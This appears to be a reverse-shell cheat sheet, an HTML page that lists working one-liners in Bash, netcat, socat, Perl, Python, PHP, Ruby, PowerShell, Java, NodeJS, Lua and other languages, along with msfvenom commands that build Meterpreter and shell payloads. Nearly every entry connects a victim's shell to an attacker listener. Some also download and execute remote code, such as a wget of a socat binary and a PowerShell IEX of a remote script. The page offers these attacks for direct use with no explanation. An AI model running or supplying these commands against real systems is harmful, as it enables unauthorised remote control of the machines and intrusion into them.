<h3>Bash TCP:</h3>
Victim:
<pre id="cmd001">bash -i >& /dev/tcp/127.0.0.1/813 0>&1</pre>
<pre id="cmd002">/bin/bash -i > /dev/tcp/127.0.0.1/813 0<& 2>&1</pre>
<pre id="cmd003">exec 5<>/dev/tcp/127.0.0.1/813;cat <&5 | while read line; do $line 2>&5 >&5; done</pre>
<pre id="cmd004">exec /bin/sh 0&lt;/dev/tcp/127.0.0.1/813 1>&0 2>&0</pre>
<pre id="cmd005">0<&196;exec 196<>/dev/tcp/127.0.0.1/813; sh <&196 >&196 2>&196</pre>

<h3>Bash UDP:</h3>
Victim:
<pre id="cmd006">sh -i >& /dev/udp/127.0.0.1/813 0>&1</pre>
Listener:
<pre id="cmd007">nc -u -lvp 813</pre>

<h3>Netcat:</h3>
<pre id="nc01">nc -e /bin/sh 127.0.0.1 813</pre>
<pre id="nc02">nc -e /bin/bash 127.0.0.1 813</pre>
<pre id="nc03">nc -c bash 127.0.0.1 813</pre>
<pre id="nc04">mknod backpipe p && nc 127.0.0.1 813 0&lt;backpipe | /bin/bash 1>backpipe </pre>
<pre id="nc05">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 813 >/tmp/f</pre>
<pre id="nc06">rm -f /tmp/p; mknod /tmp/p p && nc 127.0.0.1 813 0/tmp/p 2>&1</pre>
<pre id="nc07">rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 127.0.0.1 813 > f</pre>
<pre id="nc08">rm -f x; mknod x p && nc 127.0.0.1 813 0&lt;x | /bin/bash 1>x</pre>
Listening backdoor shell on Linux:
```
$ nc –l –p [LocalPort] –e /bin/bash
```

Listening backdoor shell on Windows:
```
C:\>nc –l –p [LocalPort] –e cmd.exe
```

Create a shell on local port [LocalPort] that can then be accessed using a fundamental Netcat client

Reverse backdoor shell on Linux:
```
$ nc [YourIPaddr] [port] –e /bin/bash
```

Reverse backdoor shell on Windows:
```
C:\>nc [YourIPaddr] [port] –e cmd.exe
```

Create a reverse shell that will attempt to connect to [YourIPaddr] on local port [port].

This shell can then be captured using a fundamental nc listener

<h3>Ncat:</h3>
<pre id="ncat01">ncat 127.0.0.1 813 -e /bin/bash</pre>
<pre id="ncat02">ncat --udp 127.0.0.1 813 -e /bin/bash</pre>

<h3>Telnet:</h3>
<pre id="telnet01">rm -f /tmp/p; mknod /tmp/p p && telnet 127.0.0.1 813 0/tmp/p 2>&1</pre>
<pre id="telnet02">telnet 127.0.0.1 813 | /bin/bash | telnet 127.0.0.1 444</pre>
<pre id="telnet03">rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet 127.0.0.1 813 > f</pre>
<pre id="telnet04">rm -f x; mknod x p && telnet 127.0.0.1 813 0&lt;x | /bin/bash 1>x</pre>

<h3>Socat:</h3>
Victim:
<pre id="socat01">/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:813</pre>
<pre id="socat02">socat tcp-connect:127.0.0.1:813 exec:"bash -li",pty,stderr,setsid,sigint,sane</pre>
Listener:
<pre id="socat03">socat file:`tty`,raw,echo=0 TCP-L:813</pre>
<br>
Victim:
<pre id="socat04">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:813</pre>

<h3>Perl:</h3>
Victim:
<pre id="perl01">perl -e 'use Socket;$i="127.0.0.1";$p=813;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</pre>
<pre id="perl02">perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"127.0.0.1:813");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'</pre>

Windows only, Victim:
<pre id="perl03">perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"127.0.0.1:813");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'</pre>

<h3>Python:</h3>
IP v4
<pre id="python01">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",813));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
<pre id="python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MY_IP",820));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>

<pre id="python02">export RHOST="127.0.0.1";export RPORT=813;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</pre>

<pre id="python03">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",813));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</pre>

IP v6
<pre id="python04">python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",813,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'</pre>
<p>
Windows only:
<pre id="python05">C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('127.0.0.1', 813)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"</pre>

<h3>PHP:</h3>
<pre id="php01">php -r '$sock=fsockopen("127.0.0.1",813);exec("/bin/sh -i <&3 >&3 2>&3");'</pre>
<pre id="php02">php -r '$s=fsockopen("127.0.0.1",813);$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);'</pre>
<pre id="php03">php -r '$s=fsockopen("127.0.0.1",813);shell_exec("/bin/sh -i <&3 >&3 2>&3");'</pre>
<pre id="php04">php -r '$s=fsockopen("127.0.0.1",813);`/bin/sh -i <&3 >&3 2>&3`;'</pre>
<pre id="php05">php -r '$s=fsockopen("127.0.0.1",813);system("/bin/sh -i <&3 >&3 2>&3");'</pre>
<pre id="php06">php -r '$s=fsockopen("127.0.0.1",813);popen("/bin/sh -i <&3 >&3 2>&3", "r");'</pre>

<h3>Ruby:</h3>
<pre id="ruby01">ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",813).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'</pre>

<pre id="ruby02">ruby -rsocket -e 'exit if fork;c=TCPSocket.new("127.0.0.1","813");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</pre>
<p>

NOTE: Windows only
<pre id="ruby03">ruby -rsocket -e 'c=TCPSocket.new("127.0.0.1","813");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</pre>

<h3>OpenSSL:</h3>
Attacker:
<pre id="ssl01">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</pre>
<pre id="ssl02">openssl s_server -quiet -key key.pem -cert cert.pem -port 813</pre>
or
<pre id="ssl03">ncat --ssl -vv -l -p 813</pre>
Victim:
<pre id="ssl04">mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 127.0.0.1:813 > /tmp/s; rm /tmp/s</pre>

<h3>Powershell:</h3>
<pre id="ps01">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("127.0.0.1",813);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</pre>
<pre id="ps02">powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',813);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</pre>
<pre id="ps03">powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')</pre>

<h3>Awk:</h3>
<pre id="awk01">awk 'BEGIN {s = "/inet/tcp/0/127.0.0.1/813"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null</pre>

<h3>TCLsh</h3>
<pre id="tcl01">echo 'set s [socket 127.0.0.1 813];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh</pre>

<h3>Java:</h3>
<pre id="java01">r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/127.0.0.1/813;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()</pre>
<pre id="java02">String host="127.0.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</pre>
<pre id="java03">Thread thread = new Thread(){
    public void run(){
        // Reverse shell here
    }
}
thread.start();</pre>

<h3>War:</h3>
<pre id="war01">msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=813 -f war > reverse.war
strings reverse.war | grep jsp # in order to get the name of the file</pre>

<h3>Lua:</h3>
Linux only
<pre id="lua01">lua -e "require('socket');require('os');t=socket.tcp();t:connect('127.0.0.1','813');os.execute('/bin/sh -i <&3 >&3 2>&3');"</pre>
Windows and Linux
<pre id="lua02">lua5.1 -e 'local host, port = "127.0.0.1", 813 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'</pre>

<h3>NodeJS:</h3>
<pre id="ndjs01">(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(813, "127.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();</pre>
<pre id="ndjs02">require('child_process').exec('nc -e /bin/sh 127.0.0.1 813')</pre>
<pre id="ndjs03">-var x = global.process.mainModule.require
-x('child_process').exec('nc 127.0.0.1 813 -e /bin/bash')</pre>
<pre id="ndjs04">https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</pre>

<h3>Groovy:</h3>

<pre id="groovy01">String host="127.0.0.1";
int port=813;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</pre>

<h3>Meterpreter Shell:</h3>
<pre id="msf01">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=813 -f exe > reverse.exe</pre>
<pre id="msf02">msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=813 -f exe > reverse.exe</pre>
<pre id="msf03">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=813 -f elf >reverse.elf</pre>
<pre id="msf04">msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=813 -f elf >reverse.elf</pre>
<pre id="msf05">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="127.0.0.1" LPORT=813 -f elf > shell.elf</pre>
<pre id="msf06">msfvenom -p windows/meterpreter/reverse_tcp LHOST="127.0.0.1" LPORT=813 -f exe > shell.exe</pre>
<pre id="msf14">msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=813 -f exe > shell.exe</pre>
<pre id="msf07">msfvenom -p osx/x86/shell_reverse_tcp LHOST="127.0.0.1" LPORT=813 -f macho > shell.macho</pre>
<pre id="msf08">msfvenom -p windows/meterpreter/reverse_tcp LHOST="127.0.0.1" LPORT=813 -f asp > shell.asp</pre>
<pre id="msf09">msfvenom -p java/jsp_shell_reverse_tcp LHOST="127.0.0.1" LPORT=813 -f raw > shell.jsp</pre>
<pre id="msf10">msfvenom -p java/jsp_shell_reverse_tcp LHOST="127.0.0.1" LPORT=813 -f war > shell.war</pre>
<pre id="msf11">msfvenom -p cmd/unix/reverse_python LHOST="127.0.0.1" LPORT=813 -f raw > shell.py</pre>
<pre id="msf12">msfvenom -p cmd/unix/reverse_bash LHOST="127.0.0.1" LPORT=813 -f raw > shell.sh</pre>
<pre id="msf13">msfvenom -p cmd/unix/reverse_perl LHOST="127.0.0.1" LPORT=813 -f raw > shell.pl</pre>


<h3>Xterm:</h3>
<pre id="xterm001">xterm -display 127.0.0.1:1
Xnest :1
xhost +targetip</pre>
